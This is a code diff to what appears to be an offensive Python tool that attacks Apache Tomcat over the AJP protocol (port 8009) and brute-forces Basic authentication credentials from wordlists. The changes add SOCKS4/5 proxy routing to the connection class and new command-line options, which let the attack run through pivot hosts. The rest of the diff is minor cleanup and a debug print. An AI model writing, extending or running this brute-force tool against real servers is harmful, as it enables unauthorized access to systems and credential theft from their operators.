@@ -69,11 +69,32 @@ def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.G
 
 
 class Tomcat(object):
-	def __init__(self, target_host, target_port):
+	def __init__(self, target_host, target_port, **kwargs):
 		self.target_host = target_host
 		self.target_port = target_port
+		socks_host = None
+		socks_port = None
+		socks_version = None
 
-		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		if kwargs is not None:
+			for key in kwargs:
+				if key == 'socks_version':
+					socks_version = kwargs[key]
+				if key == 'socks_host':
+					socks_host = kwargs[key]
+				if key == 'socks_port':
+					socks_port = kwargs[key]
+
+		if socks_host and socks_port:
+			import socks
+			self.socket  = socks.socksocket()
+			if socks_version and socks_version == 5:
+				self.socket.set_proxy(socks.SOCKS5, socks_host, socks_port)
+			else:  # Default to SOCKS4
+				self.socket.set_proxy(socks.SOCKS4, socks_host, socks_port)
+		else:  # Regular (non-SOCKS socket)
+			self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.socket.connect((target_host, target_port))
 		self.stream = self.socket.makefile("rb")
@@ -111,7 +132,7 @@ class Tomcat(object):
 		logger.info("Attacking a tomcat at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
 		self.req_uri = req_uri
 		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri)
- 	 
+
 		f_users = open(users, "r")
 		f_passwords = open(passwords, "r")
 
@@ -121,6 +142,7 @@ class Tomcat(object):
 				f_passwords.seek(0, 0)
 				for password in f_passwords:
 					if autostop and len(valid_credz) > 0:
+						print('closing socket')
 						self.socket.close()
 						return valid_credz
 
@@ -301,6 +323,9 @@ if __name__ == "__main__":
 	parser.add_argument("target", type=str, help="Hostname or IP to attack")
 	parser.add_argument("--port", type=int, default=8009, help="AJP port to attack (default is 8009)")
 	parser.add_argument('-v', '--verbose', action='count', default=1)
+	parser.add_argument('--socks-version', help='Socks version (4 or 5). Default is 4', type=int, dest='socks_version')
+	parser.add_argument('--socks-host', help='SOCKS proxy host', type=str, dest='socks_host')
+	parser.add_argument('--socks-port', help='SOCKS proxy port', type=int, dest='socks_port', default=4)
 
 	parser_bf = subparsers.add_parser('bf', help='Bruteforce Basic authentication')
 	parser_bf.set_defaults(which='bf')
@@ -352,7 +377,13 @@ if __name__ == "__main__":
 	else:
 		logger.setLevel(logging.DEBUG)
 
-	bf = Tomcat(args.target, args.port)
+	kwargs = {
+				'socks_version': args.socks_version,
+				'socks_host': args.socks_host,
+				'socks_port': args.socks_port
+			 }
+
+	bf = Tomcat(args.target, args.port, **kwargs)
 	if args.which == 'bf':
 		bf.start_bruteforce(args.users, args.passwords, args.req_uri, args.stop)
 #	elif args.which == 'req':
@@ -383,9 +414,9 @@ if __name__ == "__main__":
 				output.write(d.data)
 			else:
 				try:
-				    output.write(d.data.decode('utf8'))
+					output.write(d.data.decode('utf8'))
 				except UnicodeDecodeError:
-				    output.write(repr(d.data))
+					output.write(repr(d.data))
 
 		if args.output:
 			output.close()
